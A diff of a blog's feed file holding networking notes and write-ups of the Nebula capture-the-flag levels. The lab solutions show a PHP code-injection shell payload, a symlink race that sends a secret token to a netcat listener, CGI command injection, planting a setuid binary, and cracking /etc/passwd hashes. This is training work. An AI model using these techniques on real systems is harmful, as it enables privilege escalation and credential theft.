 The table can also contain an entry with the &lt;strong&gt;default address&lt;/strong&gt; &lt;code&gt;0.0.0.0&lt;/code&gt;. This entry is used when the router receives a packet whose destination is an &lt;em&gt;unknown network&lt;/em&gt;.&lt;/p&gt;
 &lt;h2&gt;Routing table example (router)&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Kernel IP routing table&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;Kernel IP routing table&lt;/span&gt;
 &lt;span class="err"&gt;Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface&lt;/span&gt;
 &lt;span class="err"&gt;87.169.144.1    0.0.0.0         255.255.255.255 UH        0 0          0 eth0&lt;/span&gt;
 &lt;span class="err"&gt;192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 br0&lt;/span&gt;
 &lt;span class="err"&gt;87.169.144.0    0.0.0.0         255.255.252.0   U         0 0          0 eth0&lt;/span&gt;
 &lt;span class="err"&gt;127.0.0.0       0.0.0.0         255.0.0.0       U         0 0          0 lo&lt;/span&gt;
 &lt;span class="err"&gt;0.0.0.0         87.169.144.1    0.0.0.0         UG        0 0          0 eth0&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The kernel reads routing table from the top down. The first column is the destination. The second column tells how to reach that destination.
@@ -537,8 +581,8 @@ Based on that we can think about seven layers (&lt;a href="https://docs.microsof
 &lt;h2&gt;Encapsulation&lt;/h2&gt;
 &lt;p&gt;If we look from 10.000 foot perspective, we can see only data packet. However, if we look at this closer, it's starting showing some interesting properties.
 Every layer contains paylod in a form of &lt;code&gt;header+payload&lt;/code&gt; from previous layer. It means, that at the lowest level, we're looking at&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))))&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;(header + (header + (header + (header + payload))))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This kind of behavior happens to every packet sent by host. On the other side of pipeline, receiving host, needs to unpack all the information, with regards to correct layers.&lt;/p&gt;
@@ -546,17 +590,17 @@ Every layer contains paylod in a form of &lt;code&gt;header+payload&lt;/code&gt;
 &lt;h2&gt;IP Address&lt;/h2&gt;
 &lt;h3&gt;IPv4 Address&lt;/h3&gt;
 &lt;p&gt;IPv4 address consists of 4 bytes (octets). A dot delimits every octet in the address. Each byte (&lt;code&gt;2^8&lt;/code&gt;) can represent value &lt;strong&gt;0&lt;/strong&gt; to &lt;strong&gt;255&lt;/strong&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt; 172.22.128.47&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt; 172.22.128.47&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h4&gt;Special use IPv4 addresses&lt;/h4&gt;
 &lt;p&gt;RFC5735 describes IPv4 addresses, which cannot be assigned to host, due to its special use case.
 Common addresses, that are in use:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;127.0.0.0/8    &amp;lt;-- host loopback address.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;127.0.0.0/8    &amp;lt;-- host loopback address.&lt;/span&gt;
 &lt;span class="err"&gt;169.254.0.0/16 &amp;lt;-- communication between hosts, without DHCP server cannot be found.&lt;/span&gt;
 &lt;span class="err"&gt;192.168.0.0/16 &amp;lt;-- private networks.&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;Network classes&lt;/h3&gt;
@@ -704,18 +748,18 @@ At first, I felt intimidated by &lt;code&gt;root:root&lt;/code&gt; access to &lt
 At first, I felt intimidated by &lt;code&gt;root:root&lt;/code&gt; access to &lt;code&gt;capture.pcap&lt;/code&gt; file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
 &lt;p&gt;After downloading &lt;code&gt;capture.pcap&lt;/code&gt; I was able to open it with &lt;code&gt;wireshark&lt;/code&gt;, where I've seen some tcp traffic. By selecting &lt;code&gt;Follow TCP&lt;/code&gt; I've noticed that this is dump of someone's login attempts.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;..wwwbugs login: l.le.ev.ve.el.l8.8&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;..wwwbugs login: l.le.ev.ve.el.l8.8&lt;/span&gt;
 &lt;span class="cp"&gt;..&lt;/span&gt;
 Password: backdoor...00Rm8.ate
 .
 &lt;span class="cp"&gt;..&lt;/span&gt;
 Login incorrect
 wwwbugs login:
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;However, hex dump shows some more details&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;000000B9  62                                                 b&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;000000B9  62                                                 b&lt;/span&gt;
 &lt;span class="err"&gt;000000BA  61                                                 a&lt;/span&gt;
 &lt;span class="err"&gt;000000BB  63                                                 c&lt;/span&gt;
 &lt;span class="err"&gt;000000BC  6b                                                 k&lt;/span&gt;
@@ -736,18 +780,18 @@ wwwbugs login:
 &lt;span class="err"&gt;000000CB  74                                                 t&lt;/span&gt;
 &lt;span class="err"&gt;000000CC  65                                                 e&lt;/span&gt;
 &lt;span class="err"&gt;000000CD  0d                                                 .&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;One can notice, that &lt;code&gt;x7f&lt;/code&gt; equals to &lt;code&gt;backspace&lt;/code&gt;. It probably means, that user pressed wrong key, and removed it.
 After decyphering it, it seems to be &lt;code&gt;backd00Rmate&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;➜  ~ ssh flag08@nebula&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;➜  ~ ssh flag08@nebula&lt;/span&gt;
 &lt;span class="err"&gt;flag08@nebula:~$ ls&lt;/span&gt;
 &lt;span class="err"&gt;capture.pcap&lt;/span&gt;
 &lt;span class="err"&gt;flag08@nebula:~$ getflag&lt;/span&gt;
 &lt;span class="err"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
 &lt;span class="err"&gt;flag08@nebula:~$&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-09/"&gt;Level 09&lt;/a&gt;&lt;/h2&gt;
@@ -755,7 +799,7 @@ After decyphering it, it seems to be &lt;code&gt;backd00Rmate&lt;/code&gt;.&lt;/
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;We need to use both &lt;code&gt;$filename&lt;/code&gt; and &lt;code&gt;$use_me&lt;/code&gt; variables. First one needs to contain payload, second will contain program name.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level09@nebula:~$ cat exploit.php
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level09@nebula:~$ cat exploit.php
 &lt;span class="o"&gt;[&lt;/span&gt;email &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(sh)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
 level09@nebula:~$ ~flag09/flag09 exploit.php .
 PHP Notice:  Use of undefined constant sh - assumed &lt;span class="s1"&gt;&amp;#39;sh&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
@@ -764,20 +808,20 @@ flag09
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
 sh-4.2$
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Interesting that, when I replaced &lt;code&gt;sh&lt;/code&gt; with &lt;code&gt;bash&lt;/code&gt; it is not working:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;PHP Notice:  Use of undefined constant bash - assumed &lt;span class="s1"&gt;&amp;#39;bash&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PHP Notice:  Use of undefined constant bash - assumed &lt;span class="s1"&gt;&amp;#39;bash&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
 bash-4.2$ whoami
 level09
 bash-4.2$ getflag
 getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;One can always provide &lt;code&gt;$use_me&lt;/code&gt; variable too.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level09@nebula:~$ cat exploit.php
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level09@nebula:~$ cat exploit.php
 &lt;span class="o"&gt;[&lt;/span&gt;email &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$use_me&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
 level09@nebula:~$ ~flag09/flag09 exploit.php getflag
 You have successfully executed getflag on a target account
@@ -786,7 +830,7 @@ PHP Notice:  Undefined variable: You have successfully executed getflag on a tar
 level09@nebula:~$ ~flag09/flag09 exploit.php sh
 sh-4.2$ whoami
 flag09
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-10/"&gt;Level 10&lt;/a&gt;&lt;/h2&gt;
@@ -796,7 +840,7 @@ flag09
 &lt;p&gt;Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
 &lt;p&gt;Nebula instance:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level10@nebula:~$ touch my_file
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level10@nebula:~$ touch my_file
 level10@nebula:~$ &lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; ln -sf /home/flag10/token token&lt;span class="p"&gt;;&lt;/span&gt; ln -sf my_file token&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;4467&lt;/span&gt;
 level10@nebula:~$ &lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; /home/flag10/flag10 token debian&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
@@ -805,33 +849,33 @@ You don&lt;span class="s1"&gt;&amp;#39;t have access to token&lt;/span&gt;
 Connecting to debian:18211 .. Connected!
 Sending file .. wrote file!
 Connecting to debian:18211 .. Unable to connect to host debian
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Second instance&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dasm@debian:~$ nc -klp &lt;span class="m"&gt;18211&lt;/span&gt; &amp;gt; received
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dasm@debian:~$ nc -klp &lt;span class="m"&gt;18211&lt;/span&gt; &amp;gt; received
 dasm@debian:~$ cat received
 .oO Oo.
 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Nebula instance&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level10@nebula:~$ su flag10
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level10@nebula:~$ su flag10
 Password:  &lt;span class="c1"&gt;# use found token&lt;/span&gt;
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 2</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html" rel="alternate"></link><published>2020-09-06T00:00:00-07:00</published><updated>2020-09-06T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-06:/exploit-education-nebula-part-2.html</id><summary type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 2</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html" rel="alternate"></link><published>2020-09-06T00:00:00-07:00</published><updated>2020-09-06T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-06:/exploit-education-nebula-part-2.html</id><summary type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;Source code shows, that verification happens only for &lt;code&gt;token&lt;/code&gt; name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level04@nebula:/home/flag04$ ls -la
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level04@nebula:/home/flag04$ ls -la
 total &lt;span class="m"&gt;13&lt;/span&gt;
-drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
+drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21 …&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;Source code shows, that verification happens only for &lt;code&gt;token&lt;/code&gt; name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level04@nebula:/home/flag04$ ls -la
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level04@nebula:/home/flag04$ ls -la
 total &lt;span class="m"&gt;13&lt;/span&gt;
 drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 .
 drwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root   root     &lt;span class="m"&gt;160&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt;-08-27 &lt;span class="m"&gt;07&lt;/span&gt;:18 ..
@@ -849,14 +893,14 @@ level04@nebula:~$ su flag04
 Password:  &lt;span class="c1"&gt;# use token here&lt;/span&gt;
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-05/"&gt;Level 05&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;We're looking for weak permissions. It seems that &lt;code&gt;.backup&lt;/code&gt; directory contains copy of ssh keys, which can be used.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level05@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag05
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level05@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag05
 level05@nebula:/home/flag05$ ls -ahtl
 total &lt;span class="m"&gt;9&lt;/span&gt;.0K
 drwxr-x--- &lt;span class="m"&gt;1&lt;/span&gt; flag05 level05   &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:18 .
@@ -880,14 +924,14 @@ level05@nebula:~$ tar -xvf backup-19072011.tgz
 level05@nebula:~$ ssh flag05@localhost
 flag05@nebula:~$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-06/"&gt;Level 06&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;The &lt;code&gt;flag06&lt;/code&gt; came from a legacy unix system. It probably means, that password could be stored inside &lt;code&gt;/etc/passwd&lt;/code&gt;. After retrieving password, I had to search for an answer, how to crack it. &lt;code&gt;john&lt;/code&gt; helped with that.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level06@nebula:~$ grep flag06 /etc/passwd
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level06@nebula:~$ grep flag06 /etc/passwd
 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
 ➜  ~ john --show pass
 ?:hello
@@ -897,7 +941,7 @@ level06@nebula:~$ su flag06
 Password:  &lt;span class="c1"&gt;# use found password&lt;/span&gt;
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-07/"&gt;Level 07&lt;/a&gt;&lt;/h2&gt;
@@ -905,7 +949,7 @@ You have successfully executed getflag on a target account
 &lt;p&gt;User &lt;code&gt;flag07&lt;/code&gt; is running CGI server, which is pinging provided host. Host is an parameter to URL. It means, we should be able to modify URL this way, to retrieve correct information.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
 &lt;p&gt;I struggled with that for a while.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;getflag
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;getflag
 --2020-09-05 &lt;span class="m"&gt;20&lt;/span&gt;:31:46--  http://localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;
 Resolving localhost... &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
 Connecting to localhost&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;|&lt;/span&gt;:7007... connected.
@@ -915,14 +959,14 @@ index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;: Permission denied
 
 Cannot write to &lt;span class="sb"&gt;`&lt;/span&gt;index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; (Permission denied).&lt;/span&gt;
 &lt;span class="s1"&gt;getflag is executing on a non-flag account, this doesn&amp;#39;&lt;/span&gt;t count
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;I wasn't sure, why it is not revealing flag. Finally, I searched through an internet for similar solution and found what's my mistake. I was using &lt;code&gt;;&lt;/code&gt; instead of &lt;code&gt;%3b&lt;/code&gt; which is encoded semicolon. Instead of sending my payload to website, I was sending &lt;code&gt;Host=localhost&lt;/code&gt; and later, I was running separate command, under my username.&lt;/p&gt;
 &lt;p&gt;Rookie error.&lt;/p&gt;
 &lt;h4&gt;Alternative solution&lt;/h4&gt;
 &lt;p&gt;After retrieving &lt;code&gt;getflag&lt;/code&gt; I thought about another attempt to exploit a server. For this purpose, I used &lt;code&gt;exploit.c&lt;/code&gt; prepared for another level, and I sent this query:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level07@nebula:/tmp$ cat &amp;gt; exploitable.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level07@nebula:/tmp$ cat &amp;gt; exploitable.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
 &lt;span class="s"&gt;cp /tmp/exploit /home/flag07/exploit&lt;/span&gt;
 &lt;span class="s"&gt;chmod u+s /home/flag07/exploit&lt;/span&gt;
 &lt;span class="s"&gt;EOF&lt;/span&gt;
@@ -933,13 +977,13 @@ exploit  index.cgi  thttpd.conf
 level07@nebula:/home/flag07$ ./exploit
 flag07@nebula:/home/flag07$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 1</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html" rel="alternate"></link><published>2020-09-05T00:00:00-07:00</published><updated>2020-09-05T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-05:/exploit-education-nebula-part-1.html</id><summary type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 1</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html" rel="alternate"></link><published>2020-09-05T00:00:00-07:00</published><updated>2020-09-05T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-05:/exploit-education-nebula-part-1.html</id><summary type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
 &lt;h2&gt;Basics&lt;/h2&gt;
 &lt;p&gt;Nebula VM has 20 levels. Each level can be accessed with &lt;code&gt;levelXX&lt;/code&gt; username and the same password.&lt;/p&gt;
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-00/"&gt;Level 00&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Search for all files, in all directories, belonging to &lt;code&gt;flag00&lt;/code&gt; user, with &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;setuid&lt;/a&gt;. Redirect all "permission error" (stderr …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
@@ -947,13 +991,13 @@ You have successfully executed getflag on a target account
 &lt;p&gt;Nebula VM has 20 levels. Each level can be accessed with &lt;code&gt;levelXX&lt;/code&gt; username and the same password.&lt;/p&gt;
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-00/"&gt;Level 00&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
